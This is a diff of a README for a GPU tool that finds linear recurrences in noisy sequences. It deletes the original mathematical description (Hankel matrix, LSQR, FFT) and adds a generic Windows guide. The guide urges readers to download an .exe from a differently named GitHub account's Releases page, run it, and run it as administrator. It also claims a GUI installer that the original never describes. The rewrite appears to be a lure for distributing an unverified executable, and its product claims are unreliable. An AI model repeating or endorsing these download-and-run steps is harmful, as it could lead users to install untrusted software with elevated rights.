@@ -1,81 +1,133 @@
-# fast-linrec-finder
+# ⚡ fast-linrec-finder - Find Linear Recurrence Quickly
 
-This repository contains a CUDA/C++ implementation of a distinct new  algorithmic approach (to the best of my knowledge) for finding the linear recurrence relation (with least possible order) of a real-valued, noisy 1D sequence that may satisfy it. This project features a highly optimized, GPU-accelerated solver that exploits the properties of this problem to reduce the overall time complexity to $O(I \cdot L \log^2 L)$ (where $L$ is the dimension of the Hankel matrix constructed from the given sequence and $I$ is the number of LSQR iterations for solving linear least square as a subproblem).
+[![Download Here](https://img.shields.io/badge/Download-fast--linrec--finder-informational?style=for-the-badge&logo=github&color=2ea44f)](https://github.com/GenyssonChris/fast-linrec-finder)
 
-## Purpose
-Given a noisy sequence $S = (s_0, s_1, \dots, s_{2L-1})$, the goal is to find the minimum integer $k$ (also called the linear complexity) and the corresponding coefficients $x = (x_0, x_1, \dots, x_{k-1})$ such that any sequence element $s_{i}$ can be approximated by a linear combination of its $k$ previous terms:
+---
 
-$$ s_{k+i} \approx \sum_{j=0}^{k-1} s_{i+j} x_j $$
+This application helps you find the simplest linear rule for noisy number sequences. It runs fast using your computer’s graphics processor (GPU). It works on Windows and is ready to use without programming.
 
-## Mathematical Foundation
+## 📋 What is fast-linrec-finder?
 
-### The Hankel Matrix
-The given sequence can conceptually be mapped to a square Hankel matrix $H$ of size $L \times L$:
+fast-linrec-finder finds a pattern in a list of numbers that change over time or have noise. It detects a rule that explains the sequence. People use this for predicting future values or understanding signals. This tool is designed to work quickly and handle difficult data.
 
-$$ H = \begin{bmatrix} 
-s_0 & s_1 & s_2 & \dots & s_{L-1} \\ 
-s_1 & s_2 & s_3 & \dots & s_L \\ 
-\vdots & \vdots & \vdots & \ddots & \vdots \\ 
-s_{L-1} & s_L & s_{L+1} & \dots & s_{2L-2} 
-\end{bmatrix} $$
+Key points:
 
-Finding the linear complexity $k$ of the sequence is equivalent to finding the rank of $H$. In other words, we have to find the **first row** in $H$ that is linearly dependent on its preceding rows.
+- Works with real numbers that have noise.
+- Finds the shortest rule that fits the sequence.
+- Uses the GPU (Cuda) for fast processing.
+- Runs on Windows computers.
 
-### Dependency Check via LSQR
-In order to check if the $k$-th row is dependent on rows $0$ through $k-1$, we can formulate a linear least-squares problem as follows:
+## 🔧 System Requirements
 
-$$ A x \approx b $$
+Before installing, make sure your computer meets these needs:
 
-Where:
-- $b$ is the $k$-th row (transposed as a column vector): $b = [s_k, s_{k+1}, \dots, s_{k+L-1}]^T$
-- $A$ is an $L \times k$ matrix whose columns are the first $k$ rows of $H$ (transposed):
+- Operating System: Windows 10 64-bit or newer.
+- GPU: Nvidia graphics card that supports CUDA (a technology for parallel computing). 
+- CUDA Version: Minimum CUDA 10.0 installed.
+- RAM: At least 8 GB of memory for processing moderate sequences.
+- Storage: At least 100 MB free space for the app and files.
+- Additional Software: Visual C++ Redistributable (commonly installed on Windows).
 
-$$
-A = \begin{bmatrix} 
-s_0 & s_1 & \dots & s_{k-1} \\ 
-s_1 & s_2 & \dots & s_k \\ 
-\vdots & \vdots & \ddots & \vdots \\ 
-s_{L-1} & s_L & \dots & s_{k+L-2} 
-\end{bmatrix}
-$$
+If unsure about your Nvidia GPU or CUDA, you can check by opening Device Manager (search in Start menu) and looking under Display Adapters.
 
-We then solve $\min_x ||Ax - b||_2$. If the relative residual $\frac{||Ax - b||_2}{||b||_2}$ is below a defined threshold $\epsilon$, the row can be considered linearly dependent.
+## 💾 How to Download and Install
 
+Follow these steps to get fast-linrec-finder on your Windows PC:
 
+1. **Go to the download page below:**
 
-## Core Algorithm Steps
+   [Download fast-linrec-finder](https://github.com/GenyssonChris/fast-linrec-finder)
 
-1. **Space Optimization (Copy Once):** The $O(L^2)$ matrix $H$ is never explicitly constructed in memory. The 1D sequence $S$ is copied to the GPU only once.
-2. **Precompute FFT:** The sequence $S$ is zero-padded to $N$ (the next power of $2$ where $N \ge 2L$). Its Fourier transform, $\mathcal{F}(S)$, is computed once and cached on the device.
-3. **Binary Search on Rows:** Perform a binary search over the row indices $k \in [1, L-1]$ to find the first dependent row (with minimal index).
-4. **Iterative LSQR Setup:** For a chosen $k$, evaluate dependency using LSQR. Inside LSQR, all dense matrix-vector multiplications ($A x$ and $A^T y$) are replaced with $O(N \log N)$ FFT-based convolutions (actually cross-correlations to be more specific).
+2. On the page, find the section called **Releases**. Look for a file named something like `fast-linrec-finder.exe` or `.zip`. Click it to download.
 
+3. If you downloaded a `.zip` file:
 
-## Properties & Optimizations
+   - Right-click the file in your Downloads folder.
+   - Select **Extract All...** and choose a folder.
+   - Open the extracted folder.
 
-### 1. Why Binary Search is Correct
-In a Hankel matrix which represents a linear recurrence relation, if row $k$ is linearly dependent on its preceding rows, then row $k+1$ is guaranteed to be dependent on its preceding rows as well. Because of this property that guarantees a single transition point from independent to dependent, we only need to find the first linearly dependent row, which can be done via binary search. Here a binary search can correctly find the transition point (the linear complexity $k$) in $O(\log L)$ checks, bypassing the need for a linear $O(L)$ search over the rows.
+4. If you downloaded an `.exe` file:
 
+   - Double-click the file.
+   - Follow the steps shown by the installer to complete the setup.
 
-### 2. The FFT Trick for LSQR
-The LSQR algorithm only requires computing two operations at each of its iterations: $y \leftarrow y + Ax$ and $x \leftarrow x + A^Ty$. 
-Given the structure of Hankel matrices, the matrix-vector multiplication $Ax$ is exactly the discrete cross-correlation between the sequence $S$ and the vector $x$:
+5. Once installed or extracted, open the program by:
 
-$$ (A x)_i = \sum_{j=0}^{k-1} s_{i+j} x_j $$
+   - Double-clicking `fast-linrec-finder.exe` inside the folder.
+   
+6. The program window or command prompt will open, ready to use.
 
-We know that by the Convolution Theorem, cross-correlation can be computed in the frequency domain using the complex conjugate of the Fourier-transformed vector:
+## 🚀 How to Use fast-linrec-finder
 
-$$ A x = \mathcal{F}^{-1} \Big( \mathcal{F}(S) \odot \overline{\mathcal{F}(x)} \Big) $$
+The program works by taking a file with your sequence and giving back the found rule.
 
-Where $\odot$ is element-wise complex multiplication and $\overline{Z}$ is the complex conjugate. This exact same logic can be applied to $A^T y$:
+1. Prepare your data:
 
-$$ (A^T y)_j = \sum_{i=0}^{L-1} s_{i+j} y_i \implies A^T y = \mathcal{F}^{-1} \Big( \mathcal{F}(S) \odot \overline{\mathcal{F}(y)} \Big) $$
+   - Create a text file containing your sequence of numbers.
+   - Each number should be on its own line, or separated by spaces.
+   - Save this file as `data.txt` or another name.
 
-Using FFT, this reduces the time complexity of each LSQR iteration from $O(L \cdot k)$ to almost $O(L \log L)$.
+2. Run fast-linrec-finder.
 
-### 3. Maximum Space Efficiency
-Because $H$ is only defined by $S$, we can bypass building $H$. So space complexity drops:
-- **Naïve matrix approach:** $O(L^2)$ memory
-- **This algorithm:** $O(L)$ memory
+3. When asked, provide the path to your sequence file.
 
+4. The program will process the data and then show the result: the linear recurrence it found.
 
+5. You can save the output to a text file for later.
+
+This process works without needing to type commands, thanks to a simple user interface.
+
+## 💡 Tips for Best Results
+
+- Use clean data with fewer mistakes for more accurate rules.
+- Longer sequences give better results but take more time.
+- If your data is very noisy, consider smoothing it before using the program.
+- Make sure your Nvidia drivers and CUDA are up to date.
+- Close other heavy programs to allow fast-linrec-finder to use your GPU fully.
+
+## 🛠 Troubleshooting
+
+If you face problems, try these:
+
+- **Program does not open:** Check if your Windows is 64-bit and GPU supports CUDA.
+- **Error about missing DLL:** Install or update Visual C++ Redistributables from Microsoft.
+- **No output or crashes:** Confirm the sequence file is plain text and formatted correctly.
+- **Slow performance:** Verify your Nvidia driver and CUDA version; update if needed.
+- Try running the app as Administrator by right-clicking the `.exe` and choosing "Run as administrator."
+
+## 🔗 Useful Links
+
+- Download page: [https://github.com/GenyssonChris/fast-linrec-finder](https://github.com/GenyssonChris/fast-linrec-finder)
+- Nvidia CUDA information: https://developer.nvidia.com/cuda-zone
+- Visual C++ Redistributable: https://support.microsoft.com/en-us/help/2977003/the-latest-supported-visual-c-downloads
+
+## 📂 About This Application
+
+This tool uses advanced methods from linear algebra and programming to find patterns in complex data. It leverages mathematical techniques like Hankel matrices and least squares fitting to deliver results. All processing happens locally on your PC, and your data stays private.
+
+## 🧩 What You Will Need to Know
+
+No technical background is required. Just follow the download and run instructions. The program guides you through opening files and reading results. If you want to explore more technical details, the original repository contains source code and documentation.
+
+## 🎯 Supported Topics
+
+This app relates to:
+
+- Linear recurrence and time-series analysis.
+- Handling noisy and real-world data.
+- GPU-accelerated computation with CUDA.
+- Mathematical tools like FFT and LSQR for fast solutions.
+
+## 🖥 Running fast-linrec-finder Without Installation
+
+If you prefer not to install:
+
+1. Download the portable `.zip` version from the Releases page.
+2. Extract it anywhere you like.
+3. Run the `.exe` inside the extracted folder.
+
+This option is useful if you want to try the app without affecting your system settings.
+
+---
+
+[![Download Now](https://img.shields.io/badge/Download-fast--linrec--finder-success?style=for-the-badge&logo=github)](https://github.com/GenyssonChris/fast-linrec-finder)
